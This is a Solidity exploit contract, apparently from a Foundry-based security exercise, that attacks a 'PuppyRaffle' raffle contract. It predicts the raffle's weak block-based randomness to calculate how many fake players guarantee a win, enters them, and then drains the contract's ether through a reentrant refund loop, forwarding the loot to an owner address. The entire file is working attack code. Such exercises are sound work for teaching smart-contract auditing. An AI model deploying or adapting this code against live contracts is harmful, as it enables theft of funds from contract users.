// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
import {Test, console} from "forge-std/Test.sol";

interface PuppyRaffle {
    function getActivePlayerIndex(address player) external view returns (uint256);
    function entranceFee() external view returns (uint256);
    function enter(uint256 index) external payable;
    function withdraw(uint256 amount) external;
    function enterRaffle(address[] memory newPlayers) external payable;
    function refund(uint256 playerIndex) external;
    function selectWinner() external;
}

contract ReentrancyRandomnessChain {
    address private immutable owner;
    PuppyRaffle private raffle;
    uint256 private entryFee;
    uint256 private attackerIndex;
    uint256 private prizeToBeLeft;

    event AttackStarted();
    event EthReceived(uint256 amount);
    event ReentrancyStarted();
    event LootWithdrawn(uint256 amount);

    constructor(address raffleAddress, address ownerAddress, uint playersInGame) payable {
        // Set the contract owner
        owner = ownerAddress;

        // Initialize the PuppyRaffle contract
        raffle = PuppyRaffle(raffleAddress);

        
        // Get the entrance fee from the PuppyRaffle contract
        entryFee = raffle.entranceFee();

        emit AttackStarted();
        uint256 playersNeeded = predictPlayersNeeded(playersInGame, address(this));
        console.log("Players needed: ", playersNeeded);
        console.log("Attack cost", entryFee * playersNeeded);
        attackerIndex = playersInGame;
        // Stage 3: Add the necessary number of players to the raffle
        uint256 playersNeededToBeAdd = playersNeeded - playersInGame ;
        address[] memory maliciousAddresses = new address[](playersNeededToBeAdd);
        maliciousAddresses[0] = ownerAddress;      

        // // Add the necessary number of players to the raffle
        for (uint256 p = 1; p < playersNeededToBeAdd; p++) {
            address playerAddress = address( uint160(p+100) );
            maliciousAddresses[p] = playerAddress;   
        }
        console.log("Mal goes in!");
        raffle.enterRaffle{value: entryFee * (playersNeededToBeAdd)} (maliciousAddresses);

        // Calculate prize pool
        uint256 totalAmountCollected = playersNeeded * entryFee;
        prizeToBeLeft = (totalAmountCollected * 80) / 100;
        console.log("[MC] Prize to be left: ", prizeToBeLeft);
    }

    function predictPlayersNeeded(uint _attackerIndex, address _attacker) internal view returns (uint256 _playerCount) {
        // As this is minium number of players there is no need to iterate from 0
        uint256 playerCount = 4;
        while (true) {
            uint256 winnerIndex = uint256(keccak256(abi.encodePacked(_attacker, block.timestamp,block.difficulty))) % (playerCount);
            if (winnerIndex == _attackerIndex) {
                return playerCount;
            }
            playerCount++;
        }
    }
    

    function attack() external {
        emit ReentrancyStarted();
        // We need to left enough balance to cover the prize for us to win

        raffle.refund(attackerIndex);
    }

    receive() external payable {
        emit EthReceived(msg.value);
        if (address(raffle).balance > prizeToBeLeft) {
            console.log("Raffle left balance", address(raffle).balance);
            raffle.refund(attackerIndex);
        }else{
            withdraw();
        }
    }

    function withdraw() internal {
        uint256 balance = address(this).balance;
        payable(owner).transfer(balance);
        emit LootWithdrawn(balance);
    }
}

